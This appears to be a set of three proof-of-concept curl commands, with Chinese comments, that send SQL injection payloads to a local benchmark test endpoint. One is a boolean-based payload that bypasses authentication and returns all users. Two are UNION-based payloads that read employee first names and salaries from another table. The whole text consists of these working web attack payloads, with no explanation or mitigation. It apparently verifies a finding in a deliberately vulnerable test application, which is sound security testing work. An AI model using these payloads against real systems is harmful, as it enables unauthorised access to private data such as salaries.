# PoC 1: Boolean-based 注入 - 绕过认证获取所有用户
curl -X POST 'http://127.0.0.1:8443/benchmark/sqli-00/BenchmarkTest00283' \
  -d "BenchmarkTest00283=' OR '1'='1"

# PoC 2: UNION 注入 - 跨表读取 EMPLOYEE.first_name
curl -X POST 'http://127.0.0.1:8443/benchmark/sqli-00/BenchmarkTest00283' \
  -d "BenchmarkTest00283=' UNION SELECT first_name FROM EMPLOYEE--"

# PoC 3: UNION 注入 - 跨表读取 EMPLOYEE.salary
curl -X POST 'http://127.0.0.1:8443/benchmark/sqli-00/BenchmarkTest00283' \
  -d "BenchmarkTest00283=' UNION SELECT salary FROM EMPLOYEE--"